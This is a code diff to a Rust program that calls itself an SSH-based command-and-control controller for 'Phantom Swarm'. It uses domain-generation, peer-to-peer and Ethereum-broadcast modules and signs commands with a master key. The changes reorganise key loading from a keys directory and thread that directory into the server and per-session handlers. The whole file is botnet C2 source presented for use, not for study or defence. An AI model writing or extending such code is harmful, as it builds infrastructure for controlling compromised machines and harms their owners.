@@ -9,6 +9,7 @@ use tokio::net::TcpListener;
 mod server;
 mod dga;
 mod p2p;
+mod eth_broadcaster;
 use p2p::P2PService;
 use protocol::p2p::{P2PCommand, P2P_MAGIC, P2P_TYPE_CMD};
 
@@ -17,13 +18,8 @@ use protocol::p2p::{P2PCommand, P2P_MAGIC, P2P_TYPE_CMD};
 #[command(version = "2.0")]
 #[command(about = "SSH-based C2 Controller for Phantom Swarm", long_about = None)]
 struct Cli {
-    // We removed subcommand structure because it is now a Server by default? 
-    // Or we keep subcommands for headless modes?
-    // User asked: ./phantom --key ... -> SSH Service. 
-    // So default behavior is Server.
-
-    /// Path to Master Private Key (for signing commands)
-    #[arg(long, default_value = "../../keys/master.key")]
+    /// Path to Keys Directory (contains phantom_c2.key, phantom_eth.key, etc.)
+    #[arg(long, default_value = "keys")]
     key: PathBuf,
 
     /// Bind Port for SSH
@@ -55,9 +51,13 @@ async fn main() -> Result<(), Box<dyn std::error::Error>> {
     env_logger::init();
     let cli = Cli::parse();
     
-    // 1. Load Master Signing Key (Ed25519)
-    let master_key = load_master_key(&cli.key);
-    info!("✅ Master Key Loaded. ID: {}", hex::encode(master_key.verifying_key().to_bytes()));
+    // 1. Load Master Signing Key (Ed25519) from keys directory
+    let c2_key_path = cli.key.join("phantom_c2.key");
+    let master_key = load_master_key(&c2_key_path);
+    info!("✅ Master Key Loaded from {:?}. ID: {}", c2_key_path, hex::encode(master_key.verifying_key().to_bytes()));
+    
+    // Store keys directory for later use (ETH key, etc.)
+    let keys_dir = cli.key.clone();
 
     // 2. Setup SSH Server Config
     let config = russh::server::Config {
@@ -112,7 +112,7 @@ async fn main() -> Result<(), Box<dyn std::error::Error>> {
 
     // Explicitly use the Factory/State
     // Pass p2p_service to Server so it can Broadcast
-    let server_factory = server::PhantomServer::new(Arc::new(master_key), p2p_service);
+    let server_factory = server::PhantomServer::new(Arc::new(master_key), p2p_service, keys_dir.clone());
 
     loop {
         // Accept TCP
@@ -123,12 +123,14 @@ async fn main() -> Result<(), Box<dyn std::error::Error>> {
         let state = server_factory.state.clone();
         let key = server_factory.master_key.clone();
         let p2p = server_factory.p2p_service.clone();
+        let keys_dir_clone = server_factory.keys_dir.clone();
         
         // Instantiate a fresh Session (Handler) for this connection
         let session_handler = server::PhantomSession {
             state,
             master_key: key,
             p2p_service: p2p,
+            keys_dir: keys_dir_clone,
         };
 
         tokio::spawn(async move {
